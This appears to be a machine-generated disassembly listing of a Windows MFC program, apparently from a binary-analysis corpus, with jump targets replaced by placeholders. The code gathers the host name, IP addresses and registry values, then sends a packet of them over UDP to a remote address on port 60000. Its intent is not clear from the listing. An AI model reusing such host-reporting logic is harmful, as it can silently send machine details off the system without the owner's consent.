sub_401000
push 0xffffffff
push sub_40d8b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1f8
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x38 ] esi
lea ecx [ esi + 0x4 ]
call Ordinal_MFC42_540
lea ebp [ esi + 0x20 ]
mov [ esp + 0x210 ] 0x0
mov ecx ebp
call Ordinal_MFC42_540
lea edi [ esi + 0x24 ]
mov [ esp + 0x210 ] 0x1
mov ecx edi
call Ordinal_MFC42_540
lea ecx [ esi + 0x28 ]
mov [ esp + 0x210 ] 0x2
call Ordinal_MFC42_540
lea ecx [ esi + 0x2c ]
mov [ esp + 0x210 ] 0x3
call Ordinal_MFC42_540
lea ecx [ esi + 0x30 ]
mov [ esp + 0x210 ] 0x4
call Ordinal_MFC42_540
lea ecx [ esi + 0x34 ]
mov [ esp + 0x210 ] 0x5
call Ordinal_MFC42_540
lea ecx [ esi + 0x38 ]
mov [ esp + 0x210 ] 0x6
call Ordinal_MFC42_540
lea ecx [ esi + 0x3c ]
mov [ esp + 0x210 ] 0x7
call Ordinal_MFC42_540
lea ecx [ esi + 0x40 ]
mov [ esp + 0x210 ] 0x8
call Ordinal_MFC42_540
lea ebx [ esi + 0x54 ]
mov [ esp + 0x210 ] 0x9
mov ecx ebx
call Ordinal_MFC42_540
lea eax [ esi + 0x5c ]
push 0x80
push eax
mov [ esp + 0x218 ] 0xa
mov [ esi ] r--data
call [ gethostname@IAT ]
push ecx
mov ecx esp
mov [ esp + 0x14 ] esp
push rw-data
call Ordinal_MFC42_537
push ecx
mov [ esp + 0x218 ] 0xb
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
call Ordinal_MFC42_537
lea ecx [ esp + 0x1c ]
push 0x80000002
push ecx
mov ecx esi
mov [ esp + 0x220 ] 0xa
call sub_402ac0
push eax
lea ecx [ esi + 0x4 ]
mov [ esp + 0x214 ] 0xc
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] 0xa
call Ordinal_MFC42_800
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x30 ]
push edx
push eax
push 0x4
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
mov [ esp + 0x48 ] 0x4
call Ordinal_MFC42_537
push ecx
mov [ esp + 0x224 ] 0xd
mov ecx esp
mov [ esp + 0x2c ] esp
push rw-data
call Ordinal_MFC42_537
push 0x80000001
mov ecx esi
mov [ esp + 0x228 ] 0xa
call sub_402c20
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x1
jmp r-xdata
push ecx
mov ecx esp
mov [ esp + 0x14 ] esp
push rw-data
call Ordinal_MFC42_537
lea ecx [ esp + 0x84 ]
push 0x187
push ecx
mov ecx esi
call sub_402d00
push rw-data
mov ecx ebx
call Ordinal_MFC42_860
push ecx
mov ecx esp
mov [ esp + 0x14 ] esp
push ebx
call Ordinal_MFC42_535
lea edx [ esp + 0x84 ]
push 0x155
push edx
mov ecx esi
call sub_402d00
push rw-data
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x214 ] 0xe
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x2c ]
mov [ esp + 0x214 ] 0xf
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x214 ] 0x10
call Ordinal_MFC42_537
mov bl 0x11
push rw-data
lea ecx [ esi + 0x38 ]
mov [ esp + 0x214 ] bl
call Ordinal_MFC42_860
push rw-data
lea ecx [ esi + 0x3c ]
call Ordinal_MFC42_860
push rw-data
lea ecx [ esi + 0x40 ]
call Ordinal_MFC42_860
mov ecx [ esp + 0x1c5 ]
mov edx [ esp + 0x1c9 ]
lea eax [ esi + 0x44 ]
mov [ esi + 0x44 ] ecx
mov ecx [ esp + 0x1cd ]
push ecx
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x1d5 ]
mov [ esp + 0x14 ] esp
mov [ eax + 0x8 ] ecx
mov ecx esp
mov [ eax + 0xc ] edx
lea eax [ esp + 0x28 ]
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x14 ]
push ecx
call sub_40abd0
add esp 0x8
push eax
push ecx
lea edx [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
mov [ esp + 0x21c ] 0x12
call Ordinal_MFC42_535
lea eax [ esp + 0x20 ]
push eax
call sub_40abd0
add esp 0x8
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x21c ] 0x13
call Ordinal_MFC42_922
push eax
mov ecx edi
mov [ esp + 0x214 ] 0x14
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] 0x13
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x12
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
call Ordinal_MFC42_537
lea edx [ esp + 0x18 ]
push edx
call sub_40abd0
add esp 0x8
push eax
push ecx
lea eax [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push eax
mov [ esp + 0x21c ] 0x15
call Ordinal_MFC42_535
lea ecx [ esp + 0x20 ]
push ecx
call sub_40abd0
add esp 0x8
lea edx [ esp + 0x14 ]
push eax
push edx
mov [ esp + 0x21c ] 0x16
call Ordinal_MFC42_922
push eax
lea ecx [ esi + 0x30 ]
mov [ esp + 0x214 ] 0x17
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] 0x16
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x15
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
call Ordinal_MFC42_537
lea eax [ esp + 0x18 ]
push eax
call sub_40abd0
add esp 0x8
push eax
push ecx
mov [ esp + 0x218 ] 0x18
mov ecx esp
mov [ esp + 0x24 ] esp
lea edx [ esp + 0x28 ]
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x20 ]
push eax
call sub_40abd0
add esp 0x8
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x21c ] 0x19
call Ordinal_MFC42_922
push eax
lea ecx [ esi + 0x28 ]
mov [ esp + 0x214 ] 0x1a
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] 0x19
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x18
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
call Ordinal_MFC42_537
lea edx [ esp + 0x18 ]
push edx
call sub_40abd0
add esp 0x8
push eax
push ecx
lea eax [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push eax
mov [ esp + 0x21c ] 0x1b
call Ordinal_MFC42_535
lea ecx [ esp + 0x20 ]
push ecx
call sub_40abd0
add esp 0x8
lea edx [ esp + 0x14 ]
push eax
push edx
mov [ esp + 0x21c ] 0x1c
call Ordinal_MFC42_922
push eax
lea ecx [ esi + 0x2c ]
mov [ esp + 0x214 ] 0x1d
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] 0x1c
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x1b
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
push ecx
lea eax [ esp + 0x2c ]
mov ecx esp
mov [ esp + 0x20 ] esp
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x18 ]
push ecx
call sub_40abd0
add esp 0x8
mov [ esp + 0x210 ] 0x1e
push eax
push ecx
lea edx [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x20 ]
push eax
call sub_40abd0
add esp 0x8
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x21c ] 0x1f
call Ordinal_MFC42_922
push eax
mov ecx ebp
mov [ esp + 0x214 ] 0x20
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] 0x1f
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x1e
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
push ecx
lea edx [ esp + 0x30 ]
mov ecx esp
mov [ esp + 0x20 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x18 ]
push eax
call sub_40abd0
add esp 0x8
push eax
push ecx
lea edx [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
mov [ esp + 0x21c ] 0x21
call Ordinal_MFC42_535
lea eax [ esp + 0x20 ]
push eax
call sub_40abd0
add esp 0x8
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x21c ] 0x22
call Ordinal_MFC42_922
push eax
lea ecx [ esi + 0x34 ]
mov [ esp + 0x214 ] 0x23
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x210 ] 0x22
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x210 ] 0x21
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x210 ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x3c ]
call sub_407c30
mov edx [ edi ]
mov [ esp + 0x210 ] 0x24
lea ecx [ esi + 0x10 ]
mov eax [ edx - 0x8 ]
push ecx
push eax
push eax
mov ecx edi
call Ordinal_MFC42_2915
push eax
lea ecx [ esp + 0x48 ]
call sub_408840
lea ecx [ esp + 0x3c ]
mov [ esp + 0x210 ] bl
call sub_407c70
lea ecx [ esp + 0x2c ]
mov [ esp + 0x210 ] 0x10
call Ordinal_MFC42_800
lea ecx [ esp + 0x28 ]
mov [ esp + 0x210 ] 0xf
call Ordinal_MFC42_800
lea ecx [ esp + 0x24 ]
mov [ esp + 0x210 ] 0xe
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x210 ] 0xa
call Ordinal_MFC42_800
mov ecx [ esp + 0x208 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x204
retn
sub_401720
push 0xffffffff
push sub_40d93e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x54 ]
mov [ esp + 0x10 ] 0x9
call Ordinal_MFC42_800
lea ecx [ esi + 0x40 ]
mov [ esp + 0x10 ] 0x8
call Ordinal_MFC42_800
lea ecx [ esi + 0x3c ]
mov [ esp + 0x10 ] 0x7
call Ordinal_MFC42_800
lea ecx [ esi + 0x38 ]
mov [ esp + 0x10 ] 0x6
call Ordinal_MFC42_800
lea ecx [ esi + 0x34 ]
mov [ esp + 0x10 ] 0x5
call Ordinal_MFC42_800
lea ecx [ esi + 0x30 ]
mov [ esp + 0x10 ] 0x4
call Ordinal_MFC42_800
lea ecx [ esi + 0x2c ]
mov [ esp + 0x10 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esi + 0x28 ]
mov [ esp + 0x10 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esi + 0x24 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esi + 0x20 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esi + 0x4 ]
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4017f0
push 0xffffffff
push sub_40d960
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
mov [ esp + 0x10 ] ecx
push esi
add ecx 0x5c
push edi
push ecx
call [ gethostbyname@IAT ]
lea ecx [ esp + 0x10 ]
mov edi eax
call Ordinal_MFC42_540
mov eax [ edi + 0xc ]
mov [ esp + 0x30 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov esi rw-data
mov ebp [ inet_ntoa@IAT ]
xor esi esi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx [ eax ]
push ecx
call ebp
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_860
mov edx [ edi + 0xc ]
add esi 0x4
mov eax [ edx + esi ]
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
push 0x4
push ecx
mov ecx esp
mov [ esp + 0x30 ] esp
push rw-data
mov [ esp + 0x28 ] 0x4
call Ordinal_MFC42_537
push ecx
mov [ esp + 0x44 ] 0x1
mov ecx esp
mov [ esp + 0x38 ] esp
push rw-data
call Ordinal_MFC42_537
mov esi [ esp + 0x2c ]
push 0x80000001
mov ecx esi
mov [ esp + 0x48 ] 0x0
call sub_402c20
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x30 ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x1
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x1
mov ecx esi
call sub_401970
lea ecx [ esp + 0x10 ]
mov esi eax
mov [ esp + 0x30 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x28 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x24
retn
lea edx [ esp + 0x24 ]
push edx
call Ordinal_MFC42_3811
mov eax [ eax ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_401970
push ebp
mov ebp esp
push 0xffffffff
push sub_40d9ed
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x594
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x10 ] esp
push rw-data
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x38 ] ebx
call Ordinal_MFC42_537
xor esi esi
push rw-data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] esi
call Ordinal_MFC42_537
push rw-data
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_537
push rw-data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_537
push rw-data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_537
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_537
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x5
call sub_40cab0
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x6
call sub_40cc30
mov eax [ ebp - 0x590 ]
cmp eax 0x33
ja r-xdata
push rw-data
xor ecx ecx
mov cl [ eax + lookup_table_4023e4 ]
jmp [ ecx * 4 + jump_table_4023d0 ]
mov esi [ ebp - 0x18 ]
mov edi rw-data
mov eax [ eax ]
push eax
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_860
mov ecx [ edi + 0xc ]
add esi 0x4
mov eax [ ecx + esi ]
test eax eax
jne r-xdata
cmp [ ebp - 0x594 ] 0x5
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_860
mov eax [ ebp - 0x58c ]
mov ecx [ ebp - 0x590 ]
lea edx [ ebp - 0x584 ]
push edx
mov edx [ ebp - 0x594 ]
push eax
mov eax [ ebp - 0x14 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x1c ]
push rw-data
push ecx
call Ordinal_MFC42_2818
mov edx [ ebp - 0x4e4 ]
lea eax [ ebp - 0x14 ]
shr edx 0x14
push edx
push rw-data
push eax
call Ordinal_MFC42_2818
add esp 0x28
lea ecx [ ebx + 0x5c ]
push ecx
call [ gethostbyname@IAT ]
lea ecx [ ebp - 0x18 ]
mov edi eax
call Ordinal_MFC42_540
mov edx [ edi + 0xc ]
mov [ ebp - 0x4 ] 0x7
mov eax [ edx ]
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_800
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x5
call sub_40cb80
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
mov al cl
cmp cl dl
jne r-xdata
mov [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x48 ]
call Ordinal_MFC42_268
mov ecx [ ebp - 0x24 ]
push 0x0
push 0x0
inc ecx
push 0x0
push 0x0
mov [ ebp - 0x24 ] ecx
push 0x1
push 0x0
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x12
call Ordinal_MFC42_389
mov eax [ ebx + 0x24 ]
push 0x0
push 0x0
push 0x84000002
push 0x0
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x13
call Ordinal_MFC42_5207
mov esi eax
lea eax [ ebp - 0x20 ]
push 0x4
push eax
mov edx [ esi ]
mov ecx esi
call [ edx + 0x3c ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x80 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x12
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_1567
push ecx
lea edx [ ebx + 0x54 ]
mov ecx esp
mov [ ebp - 0x3c ] esp
push edx
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_535
lea eax [ ebp - 0x20 ]
push 0x4
push eax
mov ecx ebx
call sub_402d00
lea ecx [ ebx + 0x5c ]
push ecx
call [ gethostbyname@IAT ]
mov edi eax
mov edx [ edi + 0xc ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ecx 0x5a
xor eax eax
lea edi [ ebp - 0x1ec ]
lea edx [ ebx + 0x10 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ edx ]
mov [ ebp - 0x1ec ] eax
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x1e8 ] ecx
mov eax [ edx + 0x8 ]
mov [ ebp - 0x1e4 ] eax
mov ecx [ edx + 0xc ]
lea edx [ ebx + 0x4 ]
push ecx
mov [ ebp - 0x1e0 ] ecx
mov ecx esp
mov [ ebp + 0x8 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ ebp - 0x1dc ]
mov ecx ebx
push eax
call sub_4029b0
mov ecx [ ebp - 0x18 ]
push ecx
call [ inet_addr@IAT ]
mov edx [ ebx + 0x8 ]
push ecx
mov [ ebp - 0x1cd ] eax
mov eax esp
mov [ ebp + 0x8 ] esp
lea ecx [ ebp - 0x20 ]
mov [ eax ] edx
lea eax [ ebp + 0x8 ]
push eax
push ecx
call Ordinal_MFC42_3811
mov ecx eax
call sub_403200
mov ecx [ eax ]
mov eax 0x88888889
imul ecx
add edx ecx
mov edi [ ebp - 0x1c ]
sar edx 0x5
mov eax edx
or ecx 0xffffffff
shr eax 0x1f
add edx eax
xor eax eax
mov [ ebp - 0x1c9 ] edx
lea edx [ ebp - 0x1c1 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x1c5 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x141 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4c4 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x4fc ]
call Ordinal_MFC42_2915
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x101 ]
[ edi ]
not ecx
sub edi ecx
mov [ ebp + 0x8 ] 0x0
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0xc1 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x6c ]
call Ordinal_MFC42_268
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x0
inc ecx
push 0x0
push 0x0
mov [ ebp + 0x8 ] ecx
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_389
mov eax [ ebx + 0x24 ]
push 0x0
push 0x0
push 0x84000002
push 0x0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xa
call Ordinal_MFC42_5207
mov esi eax
lea eax [ ebp - 0x24 ]
push 0x4
push eax
mov edx [ esi ]
mov ecx esi
call [ edx + 0x3c ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x64 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_1567
push ecx
lea edx [ ebx + 0x54 ]
mov ecx esp
mov [ ebp + 0x8 ] esp
push edx
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_535
lea eax [ ebp - 0x24 ]
push 0x4
push eax
mov ecx ebx
call sub_402d00
add ebx 0x5c
push ebx
call [ gethostbyname@IAT ]
mov edi eax
xor esi esi
mov ecx [ edi + 0xc ]
mov eax [ ecx ]
cmp eax esi
je r-xdata
test eax eax
je r-xdata
add esi 0x2
add edi 0x2
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor esi esi
mov ecx [ ebp - 0x18 ]
push ecx
call [ inet_addr@IAT ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x1cd ] eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x38 ] esi
call Ordinal_MFC42_268
push 0x14
mov [ ebp - 0x4 ] 0xd
call Ordinal_MFC42_823
mov ecx eax
add esp 0x4
mov [ ebp - 0x68 ] ecx
cmp ecx esi
mov [ ebp - 0x4 ] 0xe
je r-xdata
mov edx [ eax ]
push edx
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_860
mov eax [ edi + 0xc ]
add esi 0x4
mov eax [ eax + esi ]
test eax eax
jne r-xdata
mov dl [ esi ]
mov cl [ edi ]
mov al dl
cmp dl cl
jne r-xdata
mov ecx 0x5a
xor eax eax
lea edi [ ebp - 0x358 ]
lea edx [ ebx + 0x10 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ edx ]
mov [ ebp - 0x358 ] eax
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x354 ] ecx
mov eax [ edx + 0x8 ]
mov [ ebp - 0x350 ] eax
mov ecx [ edx + 0xc ]
lea edx [ ebx + 0x4 ]
push ecx
mov [ ebp - 0x34c ] ecx
mov ecx esp
mov [ ebp + 0x8 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ ebp - 0x348 ]
mov ecx ebx
push eax
call sub_4029b0
mov ecx [ ebp - 0x18 ]
push ecx
call [ inet_addr@IAT ]
mov edx [ ebx + 0x8 ]
push ecx
mov [ ebp - 0x339 ] eax
mov eax esp
mov [ ebp + 0x8 ] esp
lea ecx [ ebp - 0x3c ]
mov [ eax ] edx
lea eax [ ebp + 0x8 ]
push eax
push ecx
call Ordinal_MFC42_3811
mov ecx eax
call sub_403200
mov ecx [ eax ]
mov eax 0x88888889
imul ecx
add edx ecx
mov edi [ ebp - 0x1c ]
sar edx 0x5
mov eax edx
or ecx 0xffffffff
shr eax 0x1f
add edx eax
xor eax eax
mov [ ebp - 0x335 ] edx
lea edx [ ebp - 0x32d ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x331 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x2ad ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4c4 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x4fc ]
call Ordinal_MFC42_2915
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x26d ]
[ edi ]
not ecx
sub edi ecx
push 0xea60
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x22d ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ ebp - 0x60 ] 0x2
call [ htons@IAT ]
mov ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x60 ]
push 0x10
mov [ ebp - 0x5e ] ax
push edx
mov [ ebp - 0x5c ] ecx
mov ecx [ ebx + 0x58 ]
push 0x0
lea eax [ ebp - 0x358 ]
push 0x16b
push eax
push ecx
call [ sendto@IAT ]
or esi 0xffffffff
mov [ ebp - 0x4 ] 0x6
cmp eax esi
lea ecx [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebx + 0x58 ]
push edx
call [ closesocket@IAT ]
push 0x0
push 0x2
push 0x2
call [ socket@IAT ]
mov [ ebx + 0x58 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x50 ] 0x2
mov [ ebp - 0x4e ] 0x0
call [ inet_addr@IAT ]
mov edx [ ebx + 0x58 ]
lea ecx [ ebp - 0x50 ]
push 0x10
push ecx
push edx
mov [ ebp - 0x4c ] eax
call [ bind@IAT ]
lea eax [ ebp + 0x8 ]
push eax
call Ordinal_MFC42_3811
mov ecx [ eax ]
mov [ ebx + 0x8 ] ecx
mov eax [ eax ]
push eax
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_860
mov ecx [ edi + 0xc ]
add esi 0x4
mov eax [ ecx + esi ]
test eax eax
jne r-xdata
xor edi edi
push 0x4000000
push esi
push esi
push esi
push 0x1
push rw-data
call Ordinal_MFC42_389
mov edi eax
jmp r-xdata
xor esi esi
